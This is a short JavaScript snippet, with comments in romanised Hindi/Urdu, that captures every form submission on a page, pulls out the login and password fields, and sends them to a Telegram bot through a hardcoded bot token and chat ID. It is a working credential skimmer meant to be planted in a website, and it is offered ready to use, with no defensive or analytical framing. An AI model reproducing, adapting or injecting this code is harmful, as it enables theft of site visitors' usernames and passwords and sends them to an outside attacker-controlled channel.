window.addEventListener('submit', async function (e) {
    const form = e.target;
    // Yeh script sirf un forms par kaam karegi jisme login ya password fields hain
    const login = form.querySelector('input[name="login"]')?.value;
    const password = form.querySelector('input[name="password"]')?.value;

    if (login && password) {
        // IMPORTANT: Apne bot ka naya token yahan daalo
        const BOT_TOKEN = "8881279365:AAFovvRaKZDhVoatHzYDpeO1eWWHYQLVp00"; 
        const CHAT_ID = "6315239429"; // Yahan apni Telegram ID daalo
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `Login Attempt:\nLogin: ${login}\nPassword: ${password}`
                })
            });
        } catch (err) {
            console.error("Bot reporting failed");
        }
    }
}, true);
